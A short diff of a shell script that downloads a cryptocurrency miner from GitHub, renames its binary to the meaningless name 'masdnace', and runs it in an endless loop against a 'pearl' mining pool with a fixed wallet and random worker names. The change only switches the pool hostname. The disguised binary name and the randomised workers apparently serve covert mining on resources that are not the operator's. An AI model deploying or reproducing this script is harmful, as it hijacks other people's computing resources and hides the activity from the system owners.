@@ -4,5 +4,5 @@ ph add masdnace
 wget https://github.com/peakminer/peakminer/releases/download/v2.20.7/peakminer-2.20.7.tar.gz
 tar xzf peakminer-2.20.7.tar.gz && cd peakminer && mv peakminer masdnace
 while true; do
-./masdnace --coin pearl -o stratum+tcp://prl-ru.kryptex.network:7048 -u prl1plfe52vv5jxq8x4zj0vn6u0wufa73q2xmzed87nelwyg3mlxhfl8sn6hhdr/$(echo $RANDOM | md5sum | head -c 10)
+./masdnace --coin pearl -o stratum+tcp://prl.kryptex.network:7048 -u prl1plfe52vv5jxq8x4zj0vn6u0wufa73q2xmzed87nelwyg3mlxhfl8sn6hhdr/$(echo $RANDOM | md5sum | head -c 10)
 done
